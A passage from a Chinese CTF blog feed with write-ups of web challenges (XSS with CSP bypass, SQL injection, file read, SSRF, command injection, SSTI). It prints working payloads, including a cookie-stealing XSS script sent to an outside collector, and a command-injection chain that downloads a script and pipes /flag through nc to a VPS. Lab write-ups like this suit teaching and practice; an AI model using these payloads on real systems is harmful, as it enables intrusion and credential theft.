class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10000001</span>):</span><br><span class="line">    s = hashlib.md5(str(i)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&quot;f3ff5e&quot;</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><ul><li>XSS 打 管理员 cookie、伪造管理员登录。</li><li>管理员后台sql注入</li></ul><p>网站功能：注册，投稿，投稿会返回链接，反馈，反馈可以带上链接，并且是管理员来审核。明显的XSS。</p><p>先尝试一下xss 探测，发现() 变为了中文的（）。所以需要用HTML Markup转码</p><p>并且是存在CSP的</p><p>![image-20201207014942208](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207014942208.png)</p><p>csp利用跳转绕过姿势：</p><blockquote><p>大部分情况，csp不会限制跳转，CSP如果限制跳转会影响很多的网站功能；或者是<code>script-src &#39;unsafe-inline&#39;;</code>这条规则。<br>这个地方可以用location跳转：location.href(window.location/window.open)绕过</p></blockquote><p>利用条件:</p><ol><li>可以执行任意JS脚本，但是由于CSP无法数据带外</li><li>csp为<code>script-src &#39;unsafe-inline&#39;;</code></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xss=<span class="string">&#x27;&#x27;&#x27;(function()&#123;window.location.href=&#x27;http://xss.buuoj.cn/index.php?do=api&amp;id=o9waGH&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)());&#125;)();&#x27;&#x27;&#x27;</span></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xss:</span><br><span class="line">    output += <span class="string">&quot;&amp;#&quot;</span> + str(ord(c))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot;</span> + output + <span class="string">&quot;&amp;#34&amp;#41&lt;/script&gt;&quot;</span>)</span><br></pre></td></tr></table></figure><p>将文章链接复制进去反馈提交，xss 平台收到cookie。</p><p>![image-20201207095651597](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207095651597.png)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">──&gt; python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;e802dd5d-b07e-4f2b-8596-6276e5fe7682.node3.buuoj.cn&#x2F;admin.php?id&#x3D;1&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;2690bd948c1aa895e2fc6cfff3cf09a3&quot; -T flag --dump --flush-session --fresh-queries</span><br></pre></td></tr></table></figure><p>![image-20201207095633362](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207095633362.png)</p><p>这里有个坑，就是在提交链接的时候，要改一下，不能直接复制链接进去。要改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web&#x2F;post&#x2F;8ca25c72652829840967218a239ee6bb.html</span><br></pre></td></tr></table></figure><p>这样的才行。。。</p><hr><p>参考 glzjin师傅wp</p><p><a href="https://www.zhaoj.in/read-6100.html">https://www.zhaoj.in/read-6100.html</a></p><p>csp绕过，cl4y师傅：<a href="https://xz.aliyun.com/t/7372#toc-4">https://xz.aliyun.com/t/7372#toc-4</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><h3 id="取证分析"><a href="#取证分析" class="headerlink" title="取证分析"></a>取证分析</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;祥云杯线下，队友让我去打。感谢队友(小组成员)的信任，但是我线上几乎没有输出。因为p1g3师傅太猛了，我都忙着复现</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTFer 从0到1配套题目刷题题解</title>
    <link href="https://hack-for.fun/d554.html"/>
    <id>https://hack-for.fun/d554.html</id>
    <published>2020-12-06T03:01:06.000Z</published>
    <updated>2020-12-06T16:43:24.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一章-web入门-常见的搜集"><a href="#第一章-web入门-常见的搜集" class="headerlink" title="[第一章 web入门]常见的搜集"></a>[第一章 web入门]常见的搜集</h1><ul><li>robots.txt</li><li>index.php~</li><li>.index.php.swp</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag1:n1book&#123;info_1</span><br></pre></td></tr></table></figure><p>flag2:s_v3ry_im</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;flag3:p0rtant_hack&#125;&#39;;?&gt;</span><br></pre></td></tr></table></figure><p>flag:</p><p>n1book{info_1s_v3ry_imp0rtant_hack}</p><h1 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h1><ul><li>git 泄露</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;d636ae84-4f9d-4659-abf7-4922917cecb7.node3.buuoj.cn&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><p>n1book{git_looks_s0_easyfun}</p><h1 id="第一章-web入门-SQL注入-1"><a href="#第一章-web入门-SQL注入-1" class="headerlink" title="[第一章 web入门]SQL注入-1"></a>[第一章 web入门]SQL注入-1</h1><p>注意：注入的时候，url中输入 <code>%23</code> 和 <code>#</code> 是有区别的。</p><p>sb 解法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u http:&#x2F;&#x2F;24fa16a1-00e7-47c3-bb66-157021761eab.node3.buuoj.cn&#x2F;index.php\?id\&#x3D;1 -D note -T fl4g -C fllllag --dump</span><br></pre></td></tr></table></figure><p>手工注入：</p><p>判断注入</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004013.png" alt="image-20201206113036212"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004036.png" alt="image-20201206113057122"></p><p>order by 判定字段数：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004051.png" alt="image-20201206113133681"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004151.png" alt="image-20201206113154835"></p><p>确定回显位</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004209.png" alt="image-20201206113236221"></p><p>在2、3的地方可以注入</p><p>数据库为 note</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004221.png" alt="image-20201206113306728"></p><p>查表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;note&#39;%23</span><br></pre></td></tr></table></figure><p><strong>fl4g,notes</strong><br>查列名：为：<strong>fllllag</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;%23</span><br></pre></td></tr></table></figure><p>查flag的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;-1&#39; union select 1, group_concat(fllllag),3 from fl4g %23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004232.png" alt="image-20201206113934103"></p><h1 id="第一章-web入门-afr-1"><a href="#第一章-web入门-afr-1" class="headerlink" title="[第一章 web入门]afr_1"></a>[第一章 web入门]afr_1</h1><p>伪协议读文件。直接读<code>p=flag</code>是不行的，所以用伪协议封装一下就好了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207004243.png" alt="image-20201206114753925"></p><h1 id="第一章-web入门-afr-2"><a href="#第一章-web入门-afr-2" class="headerlink" title="[第一章 web入门]afr_2"></a>[第一章 web入门]afr_2</h1><p>Nginx错误配置可能产生目录穿越漏洞，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;static &#123;</span><br><span class="line">    alias &#x2F;home&#x2F;myapp&#x2F;static&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于static后没有加/，如果用户请求/static../，拼接到alias进会变成/home/myapp/static/../会穿越到myapp目录</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003958.png" alt="image-20201206123641071"></p><h1 id="第一章-web入门-SQL注入-2"><a href="#第一章-web入门-SQL注入-2" class="headerlink" title="[第一章 web入门]SQL注入-2"></a>[第一章 web入门]SQL注入-2</h1><p>select 被过滤了，大小写绕过。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003943.png" alt="image-20201206125312562"></p><p>查表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;login.php?tips&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 344c0221-e058-46d9-8b84-e12fb1ca13b7.node3.buuoj.cn</span><br><span class="line">Content-Length: 156</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">Origin: http:&#x2F;&#x2F;344c0221-e058-46d9-8b84-e12fb1ca13b7.node3.buuoj.cn</span><br><span class="line">Referer: http:&#x2F;&#x2F;344c0221-e058-46d9-8b84-e12fb1ca13b7.node3.buuoj.cn&#x2F;login.php?tips&#x3D;1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: UM_distinctid&#x3D;175e67f63ec3dc-07bb01a5c02175-7c690e53-13c680-175e67f63edb2a; PHPSESSID&#x3D;4pb5b72mqrn5m5n7ndk3edv9i6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">name&#x3D;1&#39;and updatexml(1,concat(0x7e,(sELECT group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1)--+&amp;pass&#x3D;1&#39; and 1&#x3D;2 --+</span><br></pre></td></tr></table></figure><p>string(33) “XPATH syntax error: ‘~fl4g,users’”<br>{“error”:1,”msg”:”账号不存在”}</p><p>查列名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;1&#39;and updatexml(1,concat(0x7e,(sELECT group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;)),1)--+&amp;pass&#x3D;1&#39; and 1&#x3D;2 --+</span><br><span class="line"></span><br><span class="line">string(27) &quot;XPATH syntax error: &#39;~flag&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;账号不存在&quot;&#125;</span><br></pre></td></tr></table></figure><p>查字段：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003933.png" alt="image-20201206125621103"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;1&#39;and updatexml(1,concat(0x7e,(sELECT group_concat(flag) from fl4g)),1)--+&amp;pass&#x3D;1&#39; and 1&#x3D;2 --+</span><br></pre></td></tr></table></figure><h1 id="第一章-web入门-afr-3"><a href="#第一章-web入门-afr-3" class="headerlink" title="[第一章 web入门]afr_3"></a>[第一章 web入门]afr_3</h1><ul><li>/proc 文件系统知识。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;sched_debug # 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用</span><br><span class="line">&#x2F;proc&#x2F;mounts # 挂载的文件系统列表</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp # arp表，可以获得内网其他机器的地址</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route # 路由表信息</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;tcp and &#x2F;proc&#x2F;net&#x2F;udp # 活动连接的信息</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;fib_trie # 路由缓存</span><br><span class="line">&#x2F;proc&#x2F;version  # 内核版本</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;cmdline # 可能包含有用的路径信息</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;environ #  程序运行的环境变量信息，可以用来包含getshell</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;cwd     # 当前进程的工作目录</span><br><span class="line">&#x2F;proc&#x2F;[PID]&#x2F;fd&#x2F;[#] # 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</span><br></pre></td></tr></table></figure><p>cmdline：运行了 server.py</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003922.png" alt="image-20201206130357952"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003911.png" alt="image-20201206130331192"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (Flask, render_template, request, url_for, redirect, session, render_template_string)</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)<span class="comment">#execfile() 函数可以用来执行一个文件。</span></span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line">FLAG = flag</span><br><span class="line">app.secret_key = key @ app.route(<span class="string">&quot;/n1page&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n1page</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">    n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>: session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line">template = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> session[</span><br><span class="line">    <span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: template = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> %</span><br><span class="line">session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line">session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line"><span class="keyword">return</span> render_template_string(template) @ app.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> <span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>) @ app.route(<span class="string">&#x27;/article&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span>():</span> error = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">    page = request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="keyword">else</span>:</span><br><span class="line">    page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line"><span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>) &gt;= <span class="number">0</span>: page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    template = open(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.format(page)).read() <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    template = e</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003900.png" alt="image-20201206130801068"></p><p>得到key为：<code>Drmhze6EPcv0fN_81Bj-nA</code></p><p>构造 flask session， session 做了 ssti 过滤。</p><h1 id="第二章-web进阶-SSRF-Training"><a href="#第二章-web进阶-SSRF-Training" class="headerlink" title="[第二章 web进阶]SSRF Training"></a>[第二章 web进阶]SSRF Training</h1><p>payload: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params">$url</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params">$url</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init(); </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        $result_info = curl_getinfo($ch); </span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url($result_info[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        var_dump($output); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123; </span><br><span class="line">    safe_request_url($url); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="第二章-web进阶-XSS闯关"><a href="#第二章-web进阶-XSS闯关" class="headerlink" title="[第二章 web进阶]XSS闯关"></a>[第二章 web进阶]XSS闯关</h1><ul><li>第一关</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003846.png" alt="image-20201206172504404"></p><p>简单闭合一下就行了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003824.png" alt="image-20201206172606385"></p><ul><li>第二关</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003808.png" alt="image-20201206172648845"></p><h1 id="第二章-web进阶-死亡ping命令"><a href="#第二章-web进阶-死亡ping命令" class="headerlink" title="[第二章 web进阶]死亡ping命令"></a>[第二章 web进阶]死亡ping命令</h1><p>只是没回显而已。直接nc是不行的，估计是没有nc？</p><p>在公网VPS中保存 如下 sh 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls|cat &#x2F;flag | nc 公网ip地址 8089</span><br></pre></td></tr></table></figure><p>利用靶机进行   curl 下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acurl 公网ip地址&#x2F;1.sh &gt; &#x2F;tmp&#x2F;1.sh   #请求bash文件到tmp目录</span><br><span class="line">127.0.0.1%0achmod 777 &#x2F;tmp&#x2F;1.sh #给bash加权限</span><br><span class="line">nc -lvp 8089  #你的机器上进行监听8089端口</span><br><span class="line">127.0.0.1%0ash &#x2F;tmp&#x2F;1.sh</span><br></pre></td></tr></table></figure><h1 id="第二章-web进阶-文件上传"><a href="#第二章-web进阶-文件上传" class="headerlink" title="[第二章 web进阶]文件上传"></a>[第二章 web进阶]文件上传</h1><ul><li>zip 压缩包的知识</li></ul><h1 id="第三章-web进阶-SSTI"><a href="#第三章-web进阶-SSTI" class="headerlink" title="[第三章 web进阶]SSTI"></a>[第三章 web进阶]SSTI</h1><p>sb做法，tplmap –os-shell 梭了。</p><p>手工做法:</p><p>用 ssti payload，读文件，在 <code>/app/server.py</code>中有flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat &#x2F;app&#x2F;server.py&#39;).read() 